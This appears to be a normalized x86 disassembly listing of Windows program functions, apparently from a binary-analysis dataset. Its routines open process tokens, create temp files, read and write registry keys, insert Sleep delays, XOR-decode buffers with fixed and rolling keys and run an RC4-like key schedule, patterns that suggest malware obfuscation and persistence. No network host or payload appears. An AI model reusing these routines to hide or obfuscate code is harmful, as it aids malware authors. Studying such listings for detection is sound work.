test eax eax
je r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x1c ] eax
call ebx
push 0x548
call sub_411160
pop ecx
mov edi eax
push edi
push 0xe
push 0x0
push [ esp + 0x20 ]
call ebp
push r--data
push edi
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push edi
call sub_410a7a
add esp 0x10
push 0x32
call esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
sub_40bdbc
push ecx
push ecx
push ebx
push ebp
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x32
pop ebp
push ebp
call esi
push ebp
call esi
mov edi [ GetCurrentProcess@IAT ]
call edi
mov ebx [ OpenProcessToken@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call ebx
test eax eax
je r-xdata
push ebp
call esi
call edi
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call ebx
test eax eax
je r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
push ebp
call esi
mov edi 0x3e8
push edi
call sub_411160
mov ebx [ GetTempPathA@IAT ]
pop ecx
mov ebp eax
push ebp
push edi
mov [ esp + 0x1c ] ebp
call ebx
push 0x570
call sub_411160
pop ecx
push eax
push 0xf
push 0x0
push ebp
mov ebp [ GetTempFileNameA@IAT ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x18 ] eax
call ebx
push 0x525
call sub_411160
pop ecx
push eax
push 0x10
push 0x0
push [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
call ebp
push r--data
push [ esp + 0x18 ]
call sub_411657
push [ esp + 0x18 ]
call sub_410a7a
push [ esp + 0x20 ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push 0x32
call esi
call [ GetCurrentProcess@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x1c ] eax
call ebx
push 0x552
call sub_411160
pop ecx
push eax
push 0x11
push 0x0
push [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x1c ] eax
call ebx
push 0x53f
call sub_411160
pop ecx
push eax
push 0x12
push 0x0
push [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x1c ] eax
call ebx
push 0x52d
call sub_411160
pop ecx
push eax
push 0x13
push 0x0
push [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
call ebp
push r--data
push [ esp + 0x14 ]
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push [ esp + 0x1c ]
call sub_410a7a
add esp 0x10
push 0x32
call esi
push 0x32
call esi
push edi
call sub_411160
pop ecx
push eax
push edi
mov [ esp + 0x1c ] eax
call ebx
push 0x550
call sub_411160
pop ecx
mov edi eax
push edi
push 0x14
push 0x0
push [ esp + 0x20 ]
call ebp
push r--data
push edi
call sub_411657
push [ esp + 0x1c ]
call sub_410a7a
push edi
call sub_410a7a
add esp 0x10
push 0x32
call esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
sub_40c03c
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov [ ebp - 0xc ] 0x3
push [ ebp + 0x8 ]
call [ RegOpenKeyA@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
xor eax eax
leave
retn
xor eax eax
jmp r-xdata
push [ ebp - 0x8 ]
call sub_411160
pop ecx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
lea ecx [ ebp - 0x8 ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call esi
test eax eax
je r-xdata
pop esi
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
xor eax eax
inc eax
sub_40c0bc
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegCreateKeyA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp - 0x4 ]
mov esi [ RegCloseKey@IAT ]
call esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
xor eax eax
leave
retn
xor eax eax
jmp r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x3
push eax
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn
push [ ebp - 0x4 ]
call esi
xor eax eax
inc eax
sub_40c124
push ebp
mov ebp esp
sub esp 0x18
push esi
lea eax [ ebp - 0x8 ]
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push [ ebp + 0x8 ]
call [ RegQueryInfoKeyA@IAT ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
push 0x64
call sub_411160
mov esi eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x16 ]
push eax
movzx eax [ ebp - 0x18 ]
push eax
push r--data
push esi
call sub_4115cd
add esp 0x24
push esi
push esi
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0xc ]
call sub_40ec7e
push esi
call sub_410a7a
pop ecx
xor eax eax
pop esi
leave
retn
sub_40c1b3
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ esi + 0xa ] di
mov [ esi + 0x8 ] di
mov [ esi + 0xc ] di
mov [ esi + 0x6 ] 0x1
mov [ esi + 0x2 ] 0x1
mov [ esi ] 0x76c
mov [ esi + 0x4 ] 0x1
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
pop edi
mov eax esi
pop esi
leave
retn
lea eax [ ebp - 0xc ]
push eax
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push [ ebp - 0x4 ]
call [ RegQueryInfoKeyA@IAT ]
push esi
lea eax [ ebp - 0xc ]
push eax
call [ FileTimeToSystemTime@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_40c22b
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_411738
push [ ebp + 0xc ]
mov esi eax
mov [ ebp - 0x14 ] esi
call sub_411738
mov edi eax
lea ecx [ esi + 0x1 ]
lea eax [ edi + 0x1 ]
imul eax ecx
push eax
call sub_411160
mov ebx eax
mov eax edi
imul eax esi
push eax
push 0x0
push ebx
mov [ ebp - 0xc ] ebx
call sub_41112d
and [ ebp - 0x4 ] 0x0
add esp 0x18
test esi esi
jle r-xdata
xor bl bl
xor ecx ecx
test esi esi
jle r-xdata
mov edx ebx
sub edx edi
mov [ ebp - 0x8 ] ebx
dec edx
push [ ebp - 0xc ]
call sub_410a7a
pop ecx
pop edi
pop esi
mov al bl
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
lea eax [ eax + edi - 0x1 ]
inc [ ebp - 0x4 ]
add [ ebp - 0x8 ] edi
add edx edi
cmp [ ebp - 0x4 ] esi
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp - 0x4 ]
add ebx ecx
mov [ ebp - 0x10 ] ebx
mov bl 0x1
inc ecx
add eax edi
cmp ecx esi
jl r-xdata
xor eax eax
test edi edi
jle r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp cl 0x3f
je r-xdata
movsx edx [ eax ]
cmp edx edi
je r-xdata
jmp r-xdata
xor ecx ecx
inc ecx
test eax eax
jle r-xdata
cmp cl 0x2a
jne r-xdata
mov ecx [ ebp + 0xc ]
mov cl [ eax + ecx ]
mov ebx [ ebp - 0x10 ]
cmp [ ebx ] cl
je r-xdata
movsx ecx [ edx + eax ]
inc ecx
jmp r-xdata
inc eax
cmp eax edi
jl r-xdata
mov ebx [ ebp - 0x4 ]
test ebx ebx
jle r-xdata
mov ebx [ ebp - 0x8 ]
mov [ ebx + eax ] cl
xor ecx ecx
inc ecx
test eax eax
jle r-xdata
xor esi esi
inc esi
movsx esi [ edx + eax + 0x1 ]
jmp r-xdata
movsx ecx [ edx + eax ]
inc ecx
jmp r-xdata
test ebx ebx
jle r-xdata
test ebx ebx
jle r-xdata
cmp ecx esi
jle r-xdata
test ebx ebx
jle r-xdata
xor ecx ecx
inc ecx
movsx ecx [ edx + eax + 0x1 ]
jmp r-xdata
test eax eax
jle r-xdata
mov esi [ ebp - 0x8 ]
mov [ esi + eax ] cl
mov esi [ ebp - 0x14 ]
jmp r-xdata
movsx ecx [ edx + eax ]
inc ecx
jmp r-xdata
sub_40c364
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ ebp + 0x10 ]
imul esi esi 0x3
push edi
xor ecx ecx
push 0x2
pop edx
mov eax esi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_411160
pop ecx
push esi
push eax
push 0xffffffff
push [ ebp + 0xc ]
xor edi edi
push edi
push edi
mov [ ebp + 0x10 ] eax
call [ MultiByteToWideChar@IAT ]
push esi
mov [ ebp - 0x4 ] eax
call sub_411160
pop ecx
push edi
push edi
push esi
mov ebx eax
push ebx
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push edi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ecx [ ebp + 0x8 ]
mov esi eax
call sub_40f5f9
cmp esi edi
jle r-xdata
push [ ebp + 0x10 ]
call sub_410a7a
push ebx
call sub_410a7a
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
movzx eax [ edi + ebx ]
mov ecx [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x11 ]
push eax
call sub_40f6ee
lea ecx [ ebp - 0x11 ]
call sub_40f609
inc edi
cmp edi esi
jl r-xdata
sub_40c404
push ebx
xor ebx ebx
cmp [ esp + 0x10 ] ebx
push edi
mov edi [ esp + 0xc ]
jbe r-xdata
mov eax edi
pop edi
pop ebx
retn
push esi
mov esi [ esp + 0x14 ]
sub esi edi
inc ebx
cmp ebx [ esp + 0x18 ]
jb r-xdata
push 0x1
call [ Sleep@IAT ]
test bl 0x4
lea eax [ ebx + edi ]
mov cl [ esi + eax ]
mov [ eax ] cl
je r-xdata
pop esi
sub_40c43b
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
imul eax eax 0x3
cdq
sub eax edx
push esi
mov esi [ ebp + 0x10 ]
sar eax 0x1
mov [ esi ] eax
add eax 0x9
push edi
push eax
call sub_411160
mov edi [ ebp + 0x14 ]
mov [ edi ] eax
xor ecx ecx
push 0x4
pop edx
lea eax [ ebx + 0x11170 ]
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_411160
push eax
mov [ ebp + 0x8 ] eax
mov eax [ edi ]
push ebx
add eax 0x9
push eax
push [ ebp + 0xc ]
call sub_40c87b
push [ ebp + 0x8 ]
mov [ esi ] eax
call sub_410a7a
xor eax eax
add esp 0x1c
cmp [ esi ] eax
mov [ ebp + 0x8 ] eax
jle r-xdata
mov eax [ edi ]
mov cl [ rw-data ]
mov [ eax ] cl
mov eax [ edi ]
mov [ eax + 0x1 ] ebx
mov eax [ edi ]
mov ecx [ esi ]
pop edi
mov [ eax + 0x5 ] ecx
add [ esi ] 0x9
pop esi
pop ebx
pop ebp
retn
mov ecx [ edi ]
lea ecx [ ecx + eax + 0x9 ]
cdq
mov [ ebp + 0x10 ] ecx
mov ecx 0xc8
idiv ecx
mov eax [ ebp + 0x10 ]
add dl 0x28
xor [ eax ] dl
mov eax [ ebp + 0x8 ]
inc eax
cmp eax [ esi ]
mov [ ebp + 0x8 ] eax
jl r-xdata
sub_40c4e6
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi + 0x5 ]
cmp ebx 0x5
mov al [ edi ]
mov ecx [ edi + 0x1 ]
mov [ ebp + 0xf ] al
mov [ ebp - 0x4 ] ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ecx 0x4
jne r-xdata
lea edx [ eax - 0x9 ]
xor eax eax
cmp ebx edx
mov [ ebp - 0x8 ] edx
mov [ ebp + 0xc ] eax
je r-xdata
lea edx [ eax - 0x9 ]
cmp ebx edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx 0xdbba0
lea ebx [ eax - 0x9 ]
mov [ ebp - 0x4 ] ecx
mov [ esi ] ecx
jmp r-xdata
test ebx ebx
jle r-xdata
test edx edx
jle r-xdata
push eax
mov [ esi ] eax
call sub_411160
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
push [ esi ]
push edi
push eax
call sub_40c404
add esp 0x10
jmp r-xdata
mov dl [ ebp + 0xf ]
cmp dl [ rw-data ]
jge r-xdata
lea eax [ ecx + 0xa ]
push eax
mov [ esi ] eax
call sub_411160
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
push [ esi ]
push ebx
push eax
lea eax [ edi + 0x9 ]
push eax
call sub_40cae4
add esp 0x14
cmp eax 0xffffffff
jne r-xdata
cdq
mov ecx 0xc8
idiv ecx
mov eax [ ebp + 0xc ]
add dl 0x28
xor [ edi + eax + 0x9 ] dl
inc eax
cmp eax ebx
mov [ ebp + 0xc ] eax
jl r-xdata
lea eax [ ecx + 0xa ]
push eax
mov [ esi ] eax
call sub_411160
mov ebx [ ebp + 0x14 ]
mov [ ebx ] eax
push [ esi ]
push [ ebp + 0x8 ]
push eax
lea eax [ edi + 0x9 ]
push eax
call sub_40cae4
add esp 0x14
cmp eax 0xffffffff
jne r-xdata
cdq
mov ebx 0xc8
idiv ebx
mov eax [ ebp + 0xc ]
add dl 0x28
xor [ edi + eax + 0x9 ] dl
inc eax
cmp eax [ ebp - 0x8 ]
mov [ ebp + 0xc ] eax
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
push [ eax ]
call sub_410a7a
push ebx
mov [ esi ] ebx
call sub_411160
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
push [ ebx ]
call sub_410a7a
mov eax [ ebp + 0x8 ]
push eax
mov [ esi ] eax
call sub_411160
mov [ ebx ] eax
jmp r-xdata
push [ esi ]
push edi
push eax
call sub_40c404
add esp 0x14
jmp r-xdata
sub_40c632
cmp eax [ esp + 0x8 ]
jae r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
lea ecx [ edx + eax ]
sub esi edx
pop esi
inc eax
inc ecx
cmp eax [ esp + 0xc ]
jb r-xdata
mov dl [ esi + ecx ]
cmp dl [ ecx ]
jne r-xdata
sub_40c653
mov ecx [ esp + 0x4 ]
push esi
push edi
push 0x5
mov edi eax
shr ecx 0x3
pop eax
lea esi [ eax - 0x1 ]
test esi esi
jl r-xdata
shl ecx 0x7
dec eax
cmp eax 0x2
jge r-xdata
pop edi
pop esi
retn
mov ecx esi
imul ecx ecx 0x7
test ecx 0xfe000000
jne r-xdata
mov [ edi ] dl
inc edi
dec esi
sub ecx 0x7
test esi esi
jge r-xdata
or edx 0x80
mov edx [ esp + 0xc ]
shr edx cl
and edx 0x7f
test esi esi
jle r-xdata
sub_40c69f
push esi
push edi
push 0x1
mov esi eax
call [ Sleep@IAT ]
xor ecx ecx
xor eax eax
movzx edx [ esi ]
mov edi edx
and edi 0x7f
shl ecx 0x7
inc esi
or ecx edi
inc eax
test dl dl
js r-xdata
mov edx [ esp + 0xc ]
pop edi
mov [ edx ] ecx
pop esi
retn
sub_40c6cb
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
sub esp 0x420
xor eax eax
cmp edx 0x1
jb r-xdata
leave
retn
push esi
push edi
mov esi 0x100
mov ecx esi
lea edi [ ebp - 0x420 ]
[ edi ]
xor ecx ecx
test edx edx
jbe r-xdata
xor eax eax
mov [ ebp - 0x1 ] 0x0
inc eax
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax ]
lea eax [ ebp + eax * 4 - 0x420 ]
inc [ eax ]
inc ecx
cmp ecx edx
jb r-xdata
inc eax
cmp eax esi
jb r-xdata
mov [ ebp - 0x1 ] al
movzx ecx [ ebp - 0x1 ]
mov edi [ ebp + eax * 4 - 0x420 ]
cmp edi [ ebp + ecx * 4 - 0x420 ]
jae r-xdata
mov edi [ ebp + 0xc ]
mov al [ ebp - 0x1 ]
push ebx
xor ebx ebx
xor esi esi
mov [ edi ] al
mov [ ebp - 0x8 ] ebx
inc esi
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax 0xf4240
cmp ebx eax
mov [ ebp - 0x1c ] eax
ja r-xdata
mov eax [ ebp + 0x8 ]
push 0x1
add ebx eax
call [ Sleep@IAT ]
and [ ebp - 0x10 ] 0x0
push 0x3
pop ecx
cmp [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
jb r-xdata
mov [ ebp - 0x1c ] ebx
mov bl [ ebx ]
inc [ ebp - 0x8 ]
mov [ esi + edi ] bl
inc esi
cmp bl [ ebp - 0x1 ]
jne r-xdata
lea eax [ ebx - 0x3 ]
mov [ ebp - 0x20 ] eax
dec [ ebp - 0xc ]
jmp r-xdata
mov [ esi + edi ] 0x0
inc esi
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
cmp eax [ ebp - 0x1c ]
jbe r-xdata
mov al [ ecx + ebx ]
cmp al [ edx + ecx ]
jne r-xdata
cmp [ ebp - 0xc ] 0x3
ja r-xdata
mov al [ ebx ]
mov edx [ ebp - 0x20 ]
cmp al [ edx ]
jne r-xdata
cmp ecx 0x8
jae r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x14 ]
jb r-xdata
mov ebx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
pop ebx
jmp r-xdata
mov al [ ebp - 0x1 ]
mov [ esi + edi ] al
inc esi
lea eax [ esi + edi ]
push ecx
call sub_40c653
push [ ebp - 0x10 ]
add esi eax
lea eax [ esi + edi ]
call sub_40c653
add esi eax
mov eax [ ebp - 0x18 ]
add [ ebp - 0x8 ] eax
sub [ ebp - 0xc ] eax
pop ecx
pop ecx
cmp ecx 0x4
jne r-xdata
push eax
push ebx
xor eax eax
call sub_40c632
cmp eax [ ebp - 0x18 ]
pop ecx
pop ecx
jbe r-xdata
mov eax [ ebp - 0x14 ]
cmp edx [ ebp + 0x10 ]
jb r-xdata
cmp ecx 0x5
jne r-xdata
cmp [ ebp - 0x10 ] 0x7f
jbe r-xdata
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov al [ edx + eax ]
mov cl [ ebp - 0x1 ]
cmp al cl
jne r-xdata
pop edi
mov eax esi
pop esi
cmp ecx 0x6
jne r-xdata
cmp [ ebp - 0x10 ] 0x3fff
jbe r-xdata
mov [ esi + edi ] al
mov [ esi + edi ] cl
inc esi
mov [ esi + edi ] 0x0
jmp r-xdata
cmp ecx 0x7
jne r-xdata
cmp [ ebp - 0x10 ] 0x1fffff
jbe r-xdata
inc esi
inc edx
cmp [ ebp - 0x10 ] 0xfffffff
jbe r-xdata
sub_40c87b
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
sub esp 0x420
cmp edx 0x10000000
push esi
push edi
jbe r-xdata
xor eax eax
cmp edx 0x1
jb r-xdata
test edx edx
jbe r-xdata
pop edi
pop esi
leave
retn
push ebx
mov esi 0x10000
mov ebx 0x1388
mov eax edx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
sub eax esi
mov edi edx
lea ecx [ edx - 0x1 ]
xor eax eax
test ecx ecx
jbe r-xdata
mov edi [ ebp + 0x14 ]
or [ edi + eax * 4 ] 0xffffffff
inc eax
inc ecx
cmp ecx ebx
jb r-xdata
mov cl [ eax + esi ]
xor cl 0x4b
mov [ esi ] cl
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x14 ]
or [ eax + edx * 4 + 0x3fffc ] 0xffffffff
mov esi 0x100
xor eax eax
mov ecx esi
lea edi [ ebp - 0x420 ]
[ edi ]
xor ecx ecx
test edx edx
jbe r-xdata
and [ ebp - 0x8 ] 0x0
cmp eax esi
jae r-xdata
cmp eax esi
jb r-xdata
xor eax eax
mov [ ebp - 0x1 ] 0x0
inc eax
mov eax [ ebp + 0x8 ]
movzx eax [ ecx + eax ]
lea eax [ ebp + eax * 4 - 0x420 ]
inc [ eax ]
inc ecx
cmp ecx edx
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
xor edx edx
mov dh [ eax + ecx ]
mov dl [ eax + ecx + 0x1 ]
mov ecx edx
mov edx [ ebp + 0x10 ]
lea ecx [ edi + ecx * 4 ]
mov esi [ ecx ]
mov [ ecx ] eax
mov [ edi + eax * 4 + 0x40000 ] esi
inc eax
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] ebx
jb r-xdata
xor ecx ecx
inc eax
cmp eax esi
jb r-xdata
mov [ ebp - 0x1 ] al
lea ecx [ edx - 0x1 ]
cmp eax ecx
jae r-xdata
lea ecx [ edx - 0x1 ]
cmp eax ecx
jb r-xdata
movzx ecx [ ebp - 0x1 ]
mov edi [ ebp + eax * 4 - 0x420 ]
cmp edi [ ebp + ecx * 4 - 0x420 ]
jae r-xdata
mov edi [ ebp + 0xc ]
mov al [ ebp - 0x1 ]
xor esi esi
xor ebx ebx
inc esi
and [ ebp - 0x8 ] ebx
mov [ edi ] al
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] edx
jmp r-xdata
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x32
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
and [ ebp - 0x10 ] 0x0
add eax ebx
mov ebx [ edx + ebx * 4 + 0x40000 ]
cmp ebx 0xffffffff
push 0x3
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] ecx
je r-xdata
and [ ebp - 0x8 ] 0x0
push 0x1
call [ Sleep@IAT ]
mov al [ eax ]
inc [ ebp - 0xc ]
mov [ esi + edi ] al
inc esi
cmp al [ ebp - 0x1 ]
jne r-xdata
mov edx [ ebp - 0xc ]
sub edx ebx
cmp edx 0xf4240
mov [ ebp - 0x1c ] edx
jae r-xdata
dec [ ebp - 0x14 ]
jmp r-xdata
mov [ esi + edi ] 0x0
inc esi
cmp ecx 0x8
jae r-xdata
mov edx [ ebp + 0x8 ]
add edx ebx
mov dl [ edx + ecx ]
cmp dl [ ecx + eax ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x3
ja r-xdata
mov al [ ebp - 0x1 ]
mov [ esi + edi ] al
inc esi
lea eax [ esi + edi ]
push ecx
call sub_40c653
push [ ebp - 0x10 ]
add esi eax
lea eax [ esi + edi ]
call sub_40c653
add esi eax
mov eax [ ebp - 0x18 ]
add [ ebp - 0xc ] eax
sub [ ebp - 0x14 ] eax
pop ecx
pop ecx
cmp ecx 0x4
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ebx [ edx + ebx * 4 + 0x40000 ]
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x1c ]
jb r-xdata
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
pop ebx
jmp r-xdata
cmp ecx 0x5
jne r-xdata
cmp [ ebp - 0x10 ] 0x7f
jbe r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
push eax
push 0x2
pop eax
lea edx [ ebx + ecx ]
call sub_40c632
cmp eax [ ebp - 0x18 ]
pop ecx
pop ecx
jbe r-xdata
mov ecx [ ebp - 0x1c ]
cmp edx [ ebp + 0x10 ]
jb r-xdata
cmp ecx 0x6
jne r-xdata
cmp [ ebp - 0x10 ] 0x3fff
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov al [ edx + eax ]
mov cl [ ebp - 0x1 ]
cmp al cl
jne r-xdata
mov eax esi
cmp ecx 0x7
jne r-xdata
cmp [ ebp - 0x10 ] 0x1fffff
jbe r-xdata
mov [ esi + edi ] al
mov [ esi + edi ] cl
inc esi
mov [ esi + edi ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0xfffffff
jbe r-xdata
inc esi
inc edx
sub_40cae4
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
sub esp 0x10
dec [ ebp + 0x14 ]
cmp edx 0x10000000
push ebx
push esi
jbe r-xdata
push edi
xor edi edi
inc edi
cmp edx edi
jae r-xdata
test edx edx
jbe r-xdata
mov ebx [ ebp + 0x8 ]
mov cl [ ebx ]
mov [ ebp - 0x1 ] cl
xor esi esi
xor eax eax
jmp r-xdata
mov eax edx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
sub eax ecx
mov esi edx
mov ecx [ ebp + 0xc ]
mov [ esi + ecx ] al
inc esi
cmp esi [ ebp + 0x14 ]
ja r-xdata
lea eax [ edi + ebx ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov bl [ eax + ecx ]
xor bl 0x4b
mov [ ecx ] bl
inc ecx
dec esi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi [ ebp + 0x10 ]
jae r-xdata
lea ecx [ ebp - 0xc ]
push ecx
call sub_40c69f
add edi eax
lea ecx [ ebp - 0x10 ]
lea eax [ edi + ebx ]
push ecx
call sub_40c69f
and [ ebp - 0x8 ] 0x0
pop ecx
add edi eax
cmp [ ebp - 0xc ] 0x0
pop ecx
jbe r-xdata
mov eax [ ebp + 0xc ]
mov [ esi + eax ] cl
inc esi
cmp esi [ ebp + 0x14 ]
ja r-xdata
mov eax esi
mov cl [ ebp - 0x1 ]
jmp r-xdata
mov eax esi
sub eax [ ebp - 0x10 ]
add eax [ ebp + 0xc ]
inc edi
jmp r-xdata
mov al [ edi + ebx ]
inc edi
cmp al cl
jne r-xdata
inc [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jb r-xdata
mov cl [ eax ]
mov edx [ ebp + 0xc ]
mov [ esi + edx ] cl
inc esi
inc eax
cmp esi [ ebp + 0x14 ]
ja r-xdata
jmp r-xdata
sub_40cbc9
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ eax ]
push esi
xor edx edx
push edi
xor ecx ecx
mov [ ecx + ebx ] cl
inc ecx
cmp ecx 0x100
jl r-xdata
mov [ eax + 0x4 ] dl
mov [ eax + 0x5 ] dl
mov [ ebp + 0x10 ] edx
xor edi edi
movzx edi al
lea eax [ edi + ebx ]
call sub_40cbbe
lea eax [ esi + 0x1 ]
cdq
idiv [ ebp + 0xc ]
inc [ ebp + 0x10 ]
cmp [ ebp + 0x10 ] 0x100
jl r-xdata
dec eax
or eax 0xffffff00
inc eax
mov eax [ ebp + 0x10 ]
lea ecx [ eax + ebx ]
mov eax [ ebp + 0x8 ]
movzx esi dl
movzx eax [ esi + eax ]
movzx edx [ ecx ]
add eax edi
add eax edx
and eax 0x800000ff
jns r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40cc37
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0xc ] 0x0
mov cl [ eax + 0x5 ]
push ebx
mov bl [ eax + 0x4 ]
push esi
mov esi [ eax ]
jle r-xdata
